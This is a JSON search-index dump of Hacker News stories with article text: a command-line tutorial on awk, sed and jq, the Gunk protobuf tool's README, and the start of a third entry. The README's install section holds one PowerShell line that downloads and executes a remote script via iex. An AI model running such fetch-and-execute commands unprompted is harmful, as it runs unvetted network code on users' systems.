{
  "responseHeader": {
    "status": 0,
    "QTime": 0
  },
  "response": {
    "numFound": 62,
    "start": 0,
    "numFoundExact": true,
    "docs": [
      {
        "story_id": [20559240],
        "story_author": ["mooreds"],
        "story_descendants": [7],
        "story_score": [23],
        "story_time": ["2019-07-29T20:45:37Z"],
        "story_title": "Learn a little jq, Awk and sed",
        "search": [
          "Learn a little jq, Awk and sed",
          "https://letterstoanewdeveloper.com/2019/07/29/learn-a-little-jq-awk-and-sed/",
          "Dear new developer, You are probably going to be dealing with text files sometime during your development career. These could be plain text, csv, or json. They may have data you want to get out, or log files you want to examine. You may be transforming from one format to another. Now, if this is a regular occurrence, you may want to build a script or a program around this problem (or use a third party service which aggregates everything together). But sometimes these files are one offs. Or you use them once in a blue moon. And it can take a little while to write a script, look at the libraries, and put it all together. Another alternative is to learn some of the unix tools available on the command line. Here are three that I consider table stakes. awk This is a multi purpose line processing utility. I often want to grab lines of a log file and figure out what is going on. Heres a few lines of a log file: 54.147.20.92 - - [26/Jul/2019:20:21:04 -0600] \"GET /wordpress HTTP/1.1\" 301 241 \"-\" \"Slackbot 1.0 (+https://api.slack.com/robots)\" 185.24.234.106 - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/02 HTTP/1.1\" 200 87872 \"http://www.mooreds.com\" \"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)\" 185.24.234.106 - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/08 HTTP/1.1\" 200 81183 \"http://www.mooreds.com\" \"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)\" If I want to see only the ip addresses (assuming these are all in a file called logs.txt), Id run something like: $ awk '{print $1}' logs.txt 54.147.20.92 185.24.234.106 185.24.234.106 Theres lots more, but you can see that youd be able to slice and dice delimited data pretty easily. Heres a great article which dives in further. sed This is another line utility. You can use it for all kinds of things, but I primarily use it to do search and replace on a file. Suppose you had the same log file, but you wanted to anonymize the the ip address and the user agent. Perhaps youre going to ship them off for long term storage or something. You can easily remove this with a couple of sed commands. $ sed 's/^[^ ]*//' logs.txt |sed 's/\"[^\"]*\"$//' - - [26/Jul/2019:20:21:04 -0600] \"GET /wordpress HTTP/1.1\" 301 241 \"-\" - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/02 HTTP/1.1\" 200 87872 \"http://www.mooreds.com\" - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/08 HTTP/1.1\" 200 81183 \"http://www.mooreds.com\" Yes, it looks like line noise, but this is the power of regular expressions. Theyre in every language (though with slight variations) and worth learning. sed gives you the power of regular expressions at the command line for processing files. I dont have a great sed tutorial Ive found, but googling shows a number. jq If you work on the command line with modern software at all, you have encountered json. Its used for configuration files and data transmission. Sometimes you get an array of json and you just want to pick out certain attributes of it. Tools like sed and awk fail at this, because they are used to newlines separating records, not curly braces and commas. Sure, you could use regular expressions to parse simple json, and there are times when Ive done this. But a far better tool is jq. Im not as savvy with this as with the others, but have used it whenever Im dealing with an API that delivers json (which is most modern ones). I can pull the API down with curl (another great tool) and parse it out with jq. I can put these all in a script and have the exploration be repeatable. I did this a few months ago when I was doing some exploration of an elastic search system. I crafted the queries with curl and then used jq to parse out the results so that I could make some sense of this. Yes, I could have done this with a real programming language, but it would have taken longer. I could also have used a gui tool like postman, but then it would not have been replicable. sed and awk should be on every system you run across; jq is non standard, but easy to install. Its worth spending some time getting to know these tools. So next time you are processing a text file and need to extract just a bit of it, reach for sed and awk. Next time you get a hairy json file and you are peering at it, look at jq. I think youll be happy with the result. Sincerely, Dan Published July 29, 2019October 17, 2020 ",
          "When I first saw someone using zsh (omz), I was awe-struck.<p>Same thing happens to the person sitting next to me when I pipe an output to jq.",
          "however, I find jq not so friendly piping its output to other programs."
        ],
        "story_type": ["Normal"],
        "url": "https://letterstoanewdeveloper.com/2019/07/29/learn-a-little-jq-awk-and-sed/",
        "comments.comment_id": [20562095, 20562592],
        "comments.comment_author": ["envolt", "magoon"],
        "comments.comment_descendants": [0, 3],
        "comments.comment_time": [
          "2019-07-30T04:14:52Z",
          "2019-07-30T06:42:37Z"
        ],
        "comments.comment_text": [
          "When I first saw someone using zsh (omz), I was awe-struck.<p>Same thing happens to the person sitting next to me when I pipe an output to jq.",
          "however, I find jq not so friendly piping its output to other programs."
        ],
        "id": "4234e676-7558-47e0-ae88-b467ee93d37b",
        "url_text": "Dear new developer, You are probably going to be dealing with text files sometime during your development career. These could be plain text, csv, or json. They may have data you want to get out, or log files you want to examine. You may be transforming from one format to another. Now, if this is a regular occurrence, you may want to build a script or a program around this problem (or use a third party service which aggregates everything together). But sometimes these files are one offs. Or you use them once in a blue moon. And it can take a little while to write a script, look at the libraries, and put it all together. Another alternative is to learn some of the unix tools available on the command line. Here are three that I consider table stakes. awk This is a multi purpose line processing utility. I often want to grab lines of a log file and figure out what is going on. Heres a few lines of a log file: 54.147.20.92 - - [26/Jul/2019:20:21:04 -0600] \"GET /wordpress HTTP/1.1\" 301 241 \"-\" \"Slackbot 1.0 (+https://api.slack.com/robots)\" 185.24.234.106 - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/02 HTTP/1.1\" 200 87872 \"http://www.mooreds.com\" \"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)\" 185.24.234.106 - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/08 HTTP/1.1\" 200 81183 \"http://www.mooreds.com\" \"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)\" If I want to see only the ip addresses (assuming these are all in a file called logs.txt), Id run something like: $ awk '{print $1}' logs.txt 54.147.20.92 185.24.234.106 185.24.234.106 Theres lots more, but you can see that youd be able to slice and dice delimited data pretty easily. Heres a great article which dives in further. sed This is another line utility. You can use it for all kinds of things, but I primarily use it to do search and replace on a file. Suppose you had the same log file, but you wanted to anonymize the the ip address and the user agent. Perhaps youre going to ship them off for long term storage or something. You can easily remove this with a couple of sed commands. $ sed 's/^[^ ]*//' logs.txt |sed 's/\"[^\"]*\"$//' - - [26/Jul/2019:20:21:04 -0600] \"GET /wordpress HTTP/1.1\" 301 241 \"-\" - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/02 HTTP/1.1\" 200 87872 \"http://www.mooreds.com\" - - [26/Jul/2019:20:20:50 -0600] \"GET /wordpress/archives/date/2004/08 HTTP/1.1\" 200 81183 \"http://www.mooreds.com\" Yes, it looks like line noise, but this is the power of regular expressions. Theyre in every language (though with slight variations) and worth learning. sed gives you the power of regular expressions at the command line for processing files. I dont have a great sed tutorial Ive found, but googling shows a number. jq If you work on the command line with modern software at all, you have encountered json. Its used for configuration files and data transmission. Sometimes you get an array of json and you just want to pick out certain attributes of it. Tools like sed and awk fail at this, because they are used to newlines separating records, not curly braces and commas. Sure, you could use regular expressions to parse simple json, and there are times when Ive done this. But a far better tool is jq. Im not as savvy with this as with the others, but have used it whenever Im dealing with an API that delivers json (which is most modern ones). I can pull the API down with curl (another great tool) and parse it out with jq. I can put these all in a script and have the exploration be repeatable. I did this a few months ago when I was doing some exploration of an elastic search system. I crafted the queries with curl and then used jq to parse out the results so that I could make some sense of this. Yes, I could have done this with a real programming language, but it would have taken longer. I could also have used a gui tool like postman, but then it would not have been replicable. sed and awk should be on every system you run across; jq is non standard, but easy to install. Its worth spending some time getting to know these tools. So next time you are processing a text file and need to extract just a bit of it, reach for sed and awk. Next time you get a hairy json file and you are peering at it, look at jq. I think youll be happy with the result. Sincerely, Dan Published July 29, 2019October 17, 2020 ",
        "_version_": 1718527417405931520
      },
      {
        "story_id": [18937195],
        "story_author": ["kenshaw"],
        "story_descendants": [39],
        "story_score": [73],
        "story_time": ["2019-01-18T05:13:09Z"],
        "story_title": "Gunk: Modern front end and syntax for Protocol Buffers",
        "search": [
          "Gunk: Modern front end and syntax for Protocol Buffers",
          "https://github.com/gunk/gunk",
          "Gunk is a modern frontend and syntax for Protocol Buffers. Quickstart | Installing | Syntax | Configuring | About | Releases Overview Gunk provides a modern project-based workflow along with a Go-derived syntax for defining types and services for use with Protocol Buffers. Gunk is designed to integrate cleanly with existing protoc based build pipelines, while standardizing workflows in a way that is familiar/accessible to Go developers. Quickstart Create a working directory for a project: $ mkdir -p ~/src/example && cd ~/src/example Install gunk and place the following Gunk definitions in example/util.gunk: package util // Util is a utility service. type Util interface { // Echo returns the passed message. Echo(Message) Message } // Message contains an echo message. type Message struct { // Msg is a message from a client. Msg string `pb:\"1\"` } Create the corresponding project configuration in example/.gunkconfig: [generate go] [generate js] import_style=commonjs binary Then, generate protocol buffer definitions/code: $ ls -A .gunkconfig util.gunk $ gunk generate $ ls -A all.pb.go all_pb.js .gunkconfig util.gunk As seen above, gunk generated the corresponding Go and JavaScript protobuf code using the options defined in the .gunkconfig. End-to-end Example A end-to-end example gRPC server implementation, using Gunk definitions is available for review. Debugging protoc commands Underlying commands executed by gunk can be viewed with the following: $ gunk generate -x protoc-gen-go protoc --js_out=import_style=commonjs,binary:/home/user/example --descriptor_set_in=/dev/stdin all.proto Installing The gunk command-line tool can be installed via Release, via Homebrew, via Scoop or via Go: Installing via Release Download a release for your platform Extract the gunk or gunk.exe file from the .tar.bz2 or .zip file Move the extracted executable to somewhere on your $PATH (Linux/macOS) or %PATH% (Windows) Installing via Homebrew (macOS) gunk is available in the gunk/gunk tap, and can be installed in the usual way with the brew command: # add tap $ brew tap gunk/gunk # install gunk $ brew install gunk Installing via Scoop (Windows) gunk can be installed using Scoop: # install scoop if not already installed iex (new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install gunk Installing via Go gunk can be installed in the usual Go fashion: # install gunk $ go get -u github.com/gunk/gunk Protobuf Dependency and Caching The gunk command-line tool uses the protoc command-line tool. gunk can be configured to use protoc at a specified path. If it isn't available, gunk will download the latest protobuf release to the user's cache, for use. It's also possible to pin a specific version, see the section on protoc configuration. Protocol Types and Messages Gunk provides an alternate, Go-derived syntax for defining protocol buffers. As such, Gunk definitions are a subset of the Go programming language. Additionally, a special +gunk annotation is recognized by gunk, to allow the declaration of protocol buffer options: package message import \"github.com/gunk/opt/http\" // Message is a Echo message. type Message struct { // Msg holds a message. Msg string `pb:\"1\" json:\"msg\"` Code int `pb:\"2\" json:\"code\"` } // Util is a utility service. type Util interface { // Echo echoes a message. // // +gunk http.Match{ // Method: \"POST\", // Path: \"/v1/echo\", // Body: \"*\", // } Echo(Message) Message } Technically speaking, gunk is not actually strict subset of go, as gunk allows unused imports; it actually requires them for some features. See the example above; in pure go, this would not be a valid go code, as http is not used outside of the comment. Scalars Gunk's Go-derived syntax uses the canonical Go scalar types of the proto3 syntax, defined by the protocol buffer project: Proto3 Type Gunk Type double float64 float float32 int32 int int32 int32 int64 int64 uint32 uint uint32 uint32 uint64 uint64 bool bool string string bytes []byte Note: Variable-length scalars will be enabled in the future using a tag parameter. Messages Gunk's Go-derived syntax uses Go's struct type declarations for declaring messages, and require a pb:\"<field_number>\" tag to indicate the field number: type Message struct { FieldA string `pb:\"1\"` } type Envelope struct { Message Message `pb:\"1\" json:\"msg\"` } There are additional tags (for example, the json: tag above), that will be recognized by gunk format, and passed on to generators, where possible. Note: When using gunk format, a valid pb:\"<field_number>\" tag will be automatically inserted if not declared. Services Gunk's Go-derived syntax uses Go's interface syntax for declaring services: type SearchService interface { Search(SearchRequest) SearchResponse } The above is equivalent to the following protobuf syntax: service SearchService { rpc Search (SearchRequest) returns (SearchResponse); } Enums Gunk's Go-derived syntax uses Go const's for declaring enums: type MyEnum int const ( MYENUM MyEnum = iota MYENUM2 ) Note: values can also be fixed numeric values or a calculated value (using iota). Maps Gunk's Go-derived syntax uses Go map's for declaring map fields: type Project struct { ProjectID string `pb:\"1\" json:\"project_id\"` } type GetProjectResponse struct { Projects map[string]Project `pb:\"1\"` } Repeated Values Gunk's Go-derived syntax uses Go's slice syntax ([]) for declaring a repeated field: type MyMessage struct { FieldA []string `pb:\"1\"` } Message Streams Gunk's Go-derived syntax uses Go chan syntax for declaring streams: type MessageService interface { List(chan Message) chan Message } The above is equivalent to the following protobuf syntax: service MessageService { rpc List(stream Message) returns (stream Message); } Protocol Options Protocol buffer options are standard messages (ie, a struct), and can be attached to any service, message, enum, or other other type declaration in a Gunk file via the doccomment preceding the type, field, or service: // MyOption is an option. type MyOption struct { Name string `pb:\"1\"` } // +gunk MyOption { // Name: \"test\", // } type MyMessage struct { /* ... */ } Project Configuration Files Gunk uses a top-level .gunkconfig configuration file for managing the Gunk protocol definitons for a project: # Example .gunkconfig for Go, grpc-gateway, Python and JS [generate go] out=v1/go plugins=grpc [generate] out=v1/go command=protoc-gen-grpc-gateway logtostderr=true [generate python] out=v1/python [generate js] out=v1/js import_style=commonjs binary Project Search Path When gunk is invoked from the command-line, it searches the passed package spec (or current working directory) for a .gunkconfig file, and walks up the directory hierarchy until a .gunkconfig is found, or the project's root is encountered. The project root is defined as the top-most directory containing a .git subdirectory, or where a go.mod file is located. Format The .gunkconfig file format is compatible with Git config syntax, and in turn is compatible with the INI file format: [generate] command=protoc-gen-go [generate] out=v1/js protoc=js Global section import_path - see \"Converting Existing Protobuf Files\" strip_enum_type_names - with this option on, enums with their type prefixed will be renamed to the version without prefix. Note that this might produce invalid protobuf that stops compiling in 1.4.* protoc-gen-go, if the enum names clash. Section [protoc] The path where to check for (or where to download) the protoc binary can be configured. The version can also be pinned. Parameters version - the version of protoc to use. If unspecified, defaults to the latest release available. Otherwise, gunk will either download the specified version, or check that the version of protoc at the specified path matches what was configured. path - the path to check for the protoc binary. If unspecified, defaults appropriate user cache directory for the user's OS. If no file exists at the path, gunk will attempt to download protoc. Section [generate[ <type>]] Each [generate] or [generate <type>] section in a .gunkconfig corresponds to a invocation of the protoc-gen-<type> tool. Parameters Each name[=value] parameter defined within a [generate] section will be passed as a parameter to the protoc-gen-<type> tool, with the exception of the following special parameters that override the behavior of the gunk generate tool: command - overrides the protoc-gen-* command executable used by gunk generate. The executable must be findable on $PATH (Linux/macOS) or %PATH% (Windows), or may be the full path to the executable. If not defined, then command will be protoc-gen-<type>, when <type> is the value in [generate <type>]. protoc - overrides the <type> value, causing gunk generate to use the protoc value in place of <type>. out - overrides the output path of protoc. If not defined, output will be the same directory as the location of the .gunk files. plugin_version - specify version of plugin. The plugin is downloaded from github/maven, built in cache and used. It is not installed in $PATH. This currently works with the following plugins: protoc-gen-go protoc-gen-grpc-java protoc-gen-grpc-gateway protoc-gen-openapiv2 (protoc-gen-swagger support is deprecated) protoc-gen-swift (installing swift itself first is necessary) protoc-gen-grpc-swift (installing swift itself first is necessary) protoc-gen-ts (installing node and npm first is necessary) protoc-gen-grpc-python (cmake, gcc is necessary; takes ~10 minutes to clone build) It is recommended to use this function everywhere, for reproducible builds, together with version for protoc. json_tag_postproc - uses json tags defined in gunk file also for go-generated file fix_paths_postproc - for js and ts - by default, gunk generates wrong paths for other imported gunk packages, because of the way gunk moves files around. Works only if js also has import_style=commonjs option. All other name[=value] pairs specified within the generate section will be passed as plugin parameters to protoc and the protoc-gen-<type> generators. Short Form The following .gunkconfig: [generate go] [generate js] out=v1/js is equivalent to: [generate] command=protoc-gen-go [generate] out=v1/js protoc=js Different forms of invocation There are three different forms of gunkconfig sections that have three different semantics. [generate] command=protoc-gen-go [generate] protoc=go [generate go] The first one uses protoc-gen-go plugin directly, without using protoc. It also attempts to move files to the same directory as the gunk file. The second one uses protoc and does not attempt to move any files. Protoc attempts to load plugin from $PATH, if it is not one of the built-in protoc plugins; this will not work together with pinned version and other gunk features and is not recommended outside of built-in protoc generators. The third version is reccomended. It will try to detect whether language is one of built-in protoc generators, in that case behaves like the second way, otherwise behaves like the first. The built-in protoc generators are: cpp java python php ruby csharp objc js Third-Party Protobuf Options Gunk provides the +gunk annotation syntax for declaring protobuf options, and specially recognizes some third-party API annotations, such as Google HTTP options, including all builtin/standard protoc options for code generation: // +gunk java.Package(\"com.example.message\") // +gunk java.MultipleFiles(true) package message import ( \"github.com/gunk/opt/http\" \"github.com/gunk/opt/file/java\" ) type Util interface { // +gunk http.Match{ // Method: \"POST\", // Path: \"/v1/echo\", // Body: \"*\", // } Echo() } Further documentation on available options can be found at the Gunk options project. Formatting Gunk Files Gunk provides the gunk format command to format .gunk files (akin to gofmt): $ gunk format /path/to/file.gunk $ gunk format <pathspec> Converting Existing Protobuf Files Gunk provides the gunk convert command that will converting existing .proto files (or a directory) to the Go-derived Gunk syntax: $ gunk convert /path/to/file.proto $ gunk convert /path/to/protobuf/directory If your .proto is referencing another .proto from another directory, you can add import_path in the global section of your .gunkconfig. If you don't provide import_path it will only search in the root directory. import_path=relative/path/to/protobuf/directory The path to provide is relative from the .gunkconfig location. Furthermore, the referenced files must contain: option go_package=\"path/of/go/package\"; The resulting .gunk file will contain the import path as defined in go_package: import ( name \"path/of/go/package\" ) About Gunk is developed by the team at Brankas, and was designed to streamline API design and development. History From the beginning of the company, the Brankas team defined API types and services in .proto files, leveraging ad-hoc Makefile's, shell scripts, and other non-standardized mechanisms for generating Protocol Buffer code. As development exploded in 2017 (and beyond) with continued addition of backend microservices/APIs, more code repositories and projects, and team members, it became necessary to standardize tooling for the organization as well as reduce the cognitive load of developers (who for the most part were working almost exclusively with Go) when declaring gRPC and REST services. Naming The Gunk name has a cheeky, backronym \"Gunk Unified N-terface Kompiler\", however the name was chosen because it was possible to secure the GitHub gunk project name, was short, concise, and not used by other projects. Additionally, \"gunk\" is an apt description for the \"gunk\" surrounding protocol definition, generation, compilation, and delivery. Contributing Issues, Pull Requests, and other contributions are greatly welcomed and appreciated! Get started with building and running gunk: # clone source repository $ git clone https://github.com/gunk/gunk.git && cd gunk # force GO111MODULES $ export GO111MODULE=on # build and run $ go build && ./gunk Dependency Management Gunk uses Go modules for dependency management, and as such requires Go 1.11+. Please run go mod tidy before submitting any PRs: $ export GO111MODULE=on $ cd gunk && go mod tidy ",
          "I'm not seeing what makes this \"modern\". proto3 is only a few years old and nothing about it strikes me as unusually archaic. Protobuf in general isn't that much older than Go. I can see why Go-compatible syntax would be attractive to Go developers, so maybe that should be in the description rather than \"modern\"?",
          "Not sure why I’d want to define a language independent interchange format in a language specific way and remove all of the tooling help at the same time. Why is this better? A why section/motivations would help greatly."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/gunk/gunk",
        "comments.comment_id": [18945203, 18945486],
        "comments.comment_author": ["djur", "grogenaut"],
        "comments.comment_descendants": [1, 1],
        "comments.comment_time": [
          "2019-01-19T03:44:30Z",
          "2019-01-19T05:20:46Z"
        ],
        "comments.comment_text": [
          "I'm not seeing what makes this \"modern\". proto3 is only a few years old and nothing about it strikes me as unusually archaic. Protobuf in general isn't that much older than Go. I can see why Go-compatible syntax would be attractive to Go developers, so maybe that should be in the description rather than \"modern\"?",
          "Not sure why I’d want to define a language independent interchange format in a language specific way and remove all of the tooling help at the same time. Why is this better? A why section/motivations would help greatly."
        ],
        "id": "263466fa-e83a-40c5-8420-ccbde3a87363",
        "url_text": "Gunk is a modern frontend and syntax for Protocol Buffers. Quickstart | Installing | Syntax | Configuring | About | Releases Overview Gunk provides a modern project-based workflow along with a Go-derived syntax for defining types and services for use with Protocol Buffers. Gunk is designed to integrate cleanly with existing protoc based build pipelines, while standardizing workflows in a way that is familiar/accessible to Go developers. Quickstart Create a working directory for a project: $ mkdir -p ~/src/example && cd ~/src/example Install gunk and place the following Gunk definitions in example/util.gunk: package util // Util is a utility service. type Util interface { // Echo returns the passed message. Echo(Message) Message } // Message contains an echo message. type Message struct { // Msg is a message from a client. Msg string `pb:\"1\"` } Create the corresponding project configuration in example/.gunkconfig: [generate go] [generate js] import_style=commonjs binary Then, generate protocol buffer definitions/code: $ ls -A .gunkconfig util.gunk $ gunk generate $ ls -A all.pb.go all_pb.js .gunkconfig util.gunk As seen above, gunk generated the corresponding Go and JavaScript protobuf code using the options defined in the .gunkconfig. End-to-end Example A end-to-end example gRPC server implementation, using Gunk definitions is available for review. Debugging protoc commands Underlying commands executed by gunk can be viewed with the following: $ gunk generate -x protoc-gen-go protoc --js_out=import_style=commonjs,binary:/home/user/example --descriptor_set_in=/dev/stdin all.proto Installing The gunk command-line tool can be installed via Release, via Homebrew, via Scoop or via Go: Installing via Release Download a release for your platform Extract the gunk or gunk.exe file from the .tar.bz2 or .zip file Move the extracted executable to somewhere on your $PATH (Linux/macOS) or %PATH% (Windows) Installing via Homebrew (macOS) gunk is available in the gunk/gunk tap, and can be installed in the usual way with the brew command: # add tap $ brew tap gunk/gunk # install gunk $ brew install gunk Installing via Scoop (Windows) gunk can be installed using Scoop: # install scoop if not already installed iex (new-object net.webclient).downloadstring('https://get.scoop.sh') scoop install gunk Installing via Go gunk can be installed in the usual Go fashion: # install gunk $ go get -u github.com/gunk/gunk Protobuf Dependency and Caching The gunk command-line tool uses the protoc command-line tool. gunk can be configured to use protoc at a specified path. If it isn't available, gunk will download the latest protobuf release to the user's cache, for use. It's also possible to pin a specific version, see the section on protoc configuration. Protocol Types and Messages Gunk provides an alternate, Go-derived syntax for defining protocol buffers. As such, Gunk definitions are a subset of the Go programming language. Additionally, a special +gunk annotation is recognized by gunk, to allow the declaration of protocol buffer options: package message import \"github.com/gunk/opt/http\" // Message is a Echo message. type Message struct { // Msg holds a message. Msg string `pb:\"1\" json:\"msg\"` Code int `pb:\"2\" json:\"code\"` } // Util is a utility service. type Util interface { // Echo echoes a message. // // +gunk http.Match{ // Method: \"POST\", // Path: \"/v1/echo\", // Body: \"*\", // } Echo(Message) Message } Technically speaking, gunk is not actually strict subset of go, as gunk allows unused imports; it actually requires them for some features. See the example above; in pure go, this would not be a valid go code, as http is not used outside of the comment. Scalars Gunk's Go-derived syntax uses the canonical Go scalar types of the proto3 syntax, defined by the protocol buffer project: Proto3 Type Gunk Type double float64 float float32 int32 int int32 int32 int64 int64 uint32 uint uint32 uint32 uint64 uint64 bool bool string string bytes []byte Note: Variable-length scalars will be enabled in the future using a tag parameter. Messages Gunk's Go-derived syntax uses Go's struct type declarations for declaring messages, and require a pb:\"<field_number>\" tag to indicate the field number: type Message struct { FieldA string `pb:\"1\"` } type Envelope struct { Message Message `pb:\"1\" json:\"msg\"` } There are additional tags (for example, the json: tag above), that will be recognized by gunk format, and passed on to generators, where possible. Note: When using gunk format, a valid pb:\"<field_number>\" tag will be automatically inserted if not declared. Services Gunk's Go-derived syntax uses Go's interface syntax for declaring services: type SearchService interface { Search(SearchRequest) SearchResponse } The above is equivalent to the following protobuf syntax: service SearchService { rpc Search (SearchRequest) returns (SearchResponse); } Enums Gunk's Go-derived syntax uses Go const's for declaring enums: type MyEnum int const ( MYENUM MyEnum = iota MYENUM2 ) Note: values can also be fixed numeric values or a calculated value (using iota). Maps Gunk's Go-derived syntax uses Go map's for declaring map fields: type Project struct { ProjectID string `pb:\"1\" json:\"project_id\"` } type GetProjectResponse struct { Projects map[string]Project `pb:\"1\"` } Repeated Values Gunk's Go-derived syntax uses Go's slice syntax ([]) for declaring a repeated field: type MyMessage struct { FieldA []string `pb:\"1\"` } Message Streams Gunk's Go-derived syntax uses Go chan syntax for declaring streams: type MessageService interface { List(chan Message) chan Message } The above is equivalent to the following protobuf syntax: service MessageService { rpc List(stream Message) returns (stream Message); } Protocol Options Protocol buffer options are standard messages (ie, a struct), and can be attached to any service, message, enum, or other other type declaration in a Gunk file via the doccomment preceding the type, field, or service: // MyOption is an option. type MyOption struct { Name string `pb:\"1\"` } // +gunk MyOption { // Name: \"test\", // } type MyMessage struct { /* ... */ } Project Configuration Files Gunk uses a top-level .gunkconfig configuration file for managing the Gunk protocol definitons for a project: # Example .gunkconfig for Go, grpc-gateway, Python and JS [generate go] out=v1/go plugins=grpc [generate] out=v1/go command=protoc-gen-grpc-gateway logtostderr=true [generate python] out=v1/python [generate js] out=v1/js import_style=commonjs binary Project Search Path When gunk is invoked from the command-line, it searches the passed package spec (or current working directory) for a .gunkconfig file, and walks up the directory hierarchy until a .gunkconfig is found, or the project's root is encountered. The project root is defined as the top-most directory containing a .git subdirectory, or where a go.mod file is located. Format The .gunkconfig file format is compatible with Git config syntax, and in turn is compatible with the INI file format: [generate] command=protoc-gen-go [generate] out=v1/js protoc=js Global section import_path - see \"Converting Existing Protobuf Files\" strip_enum_type_names - with this option on, enums with their type prefixed will be renamed to the version without prefix. Note that this might produce invalid protobuf that stops compiling in 1.4.* protoc-gen-go, if the enum names clash. Section [protoc] The path where to check for (or where to download) the protoc binary can be configured. The version can also be pinned. Parameters version - the version of protoc to use. If unspecified, defaults to the latest release available. Otherwise, gunk will either download the specified version, or check that the version of protoc at the specified path matches what was configured. path - the path to check for the protoc binary. If unspecified, defaults appropriate user cache directory for the user's OS. If no file exists at the path, gunk will attempt to download protoc. Section [generate[ <type>]] Each [generate] or [generate <type>] section in a .gunkconfig corresponds to a invocation of the protoc-gen-<type> tool. Parameters Each name[=value] parameter defined within a [generate] section will be passed as a parameter to the protoc-gen-<type> tool, with the exception of the following special parameters that override the behavior of the gunk generate tool: command - overrides the protoc-gen-* command executable used by gunk generate. The executable must be findable on $PATH (Linux/macOS) or %PATH% (Windows), or may be the full path to the executable. If not defined, then command will be protoc-gen-<type>, when <type> is the value in [generate <type>]. protoc - overrides the <type> value, causing gunk generate to use the protoc value in place of <type>. out - overrides the output path of protoc. If not defined, output will be the same directory as the location of the .gunk files. plugin_version - specify version of plugin. The plugin is downloaded from github/maven, built in cache and used. It is not installed in $PATH. This currently works with the following plugins: protoc-gen-go protoc-gen-grpc-java protoc-gen-grpc-gateway protoc-gen-openapiv2 (protoc-gen-swagger support is deprecated) protoc-gen-swift (installing swift itself first is necessary) protoc-gen-grpc-swift (installing swift itself first is necessary) protoc-gen-ts (installing node and npm first is necessary) protoc-gen-grpc-python (cmake, gcc is necessary; takes ~10 minutes to clone build) It is recommended to use this function everywhere, for reproducible builds, together with version for protoc. json_tag_postproc - uses json tags defined in gunk file also for go-generated file fix_paths_postproc - for js and ts - by default, gunk generates wrong paths for other imported gunk packages, because of the way gunk moves files around. Works only if js also has import_style=commonjs option. All other name[=value] pairs specified within the generate section will be passed as plugin parameters to protoc and the protoc-gen-<type> generators. Short Form The following .gunkconfig: [generate go] [generate js] out=v1/js is equivalent to: [generate] command=protoc-gen-go [generate] out=v1/js protoc=js Different forms of invocation There are three different forms of gunkconfig sections that have three different semantics. [generate] command=protoc-gen-go [generate] protoc=go [generate go] The first one uses protoc-gen-go plugin directly, without using protoc. It also attempts to move files to the same directory as the gunk file. The second one uses protoc and does not attempt to move any files. Protoc attempts to load plugin from $PATH, if it is not one of the built-in protoc plugins; this will not work together with pinned version and other gunk features and is not recommended outside of built-in protoc generators. The third version is reccomended. It will try to detect whether language is one of built-in protoc generators, in that case behaves like the second way, otherwise behaves like the first. The built-in protoc generators are: cpp java python php ruby csharp objc js Third-Party Protobuf Options Gunk provides the +gunk annotation syntax for declaring protobuf options, and specially recognizes some third-party API annotations, such as Google HTTP options, including all builtin/standard protoc options for code generation: // +gunk java.Package(\"com.example.message\") // +gunk java.MultipleFiles(true) package message import ( \"github.com/gunk/opt/http\" \"github.com/gunk/opt/file/java\" ) type Util interface { // +gunk http.Match{ // Method: \"POST\", // Path: \"/v1/echo\", // Body: \"*\", // } Echo() } Further documentation on available options can be found at the Gunk options project. Formatting Gunk Files Gunk provides the gunk format command to format .gunk files (akin to gofmt): $ gunk format /path/to/file.gunk $ gunk format <pathspec> Converting Existing Protobuf Files Gunk provides the gunk convert command that will converting existing .proto files (or a directory) to the Go-derived Gunk syntax: $ gunk convert /path/to/file.proto $ gunk convert /path/to/protobuf/directory If your .proto is referencing another .proto from another directory, you can add import_path in the global section of your .gunkconfig. If you don't provide import_path it will only search in the root directory. import_path=relative/path/to/protobuf/directory The path to provide is relative from the .gunkconfig location. Furthermore, the referenced files must contain: option go_package=\"path/of/go/package\"; The resulting .gunk file will contain the import path as defined in go_package: import ( name \"path/of/go/package\" ) About Gunk is developed by the team at Brankas, and was designed to streamline API design and development. History From the beginning of the company, the Brankas team defined API types and services in .proto files, leveraging ad-hoc Makefile's, shell scripts, and other non-standardized mechanisms for generating Protocol Buffer code. As development exploded in 2017 (and beyond) with continued addition of backend microservices/APIs, more code repositories and projects, and team members, it became necessary to standardize tooling for the organization as well as reduce the cognitive load of developers (who for the most part were working almost exclusively with Go) when declaring gRPC and REST services. Naming The Gunk name has a cheeky, backronym \"Gunk Unified N-terface Kompiler\", however the name was chosen because it was possible to secure the GitHub gunk project name, was short, concise, and not used by other projects. Additionally, \"gunk\" is an apt description for the \"gunk\" surrounding protocol definition, generation, compilation, and delivery. Contributing Issues, Pull Requests, and other contributions are greatly welcomed and appreciated! Get started with building and running gunk: # clone source repository $ git clone https://github.com/gunk/gunk.git && cd gunk # force GO111MODULES $ export GO111MODULE=on # build and run $ go build && ./gunk Dependency Management Gunk uses Go modules for dependency management, and as such requires Go 1.11+. Please run go mod tidy before submitting any PRs: $ export GO111MODULE=on $ cd gunk && go mod tidy ",
        "_version_": 1718527382556508160
      },
      {
        "story_id": [18895856],
        "story_author": ["ingve"],
        "story_descendants": [41],
        "story_score": [96],
        "story_time": ["2019-01-13T09:04:55Z"],
        "story_title": "Writing custom tools with Swift",
        "search": [
          "Writing custom tools with Swift",
          "https://paul-samuels.com/blog/2019/01/12/writing-custom-tools-with-swift/",
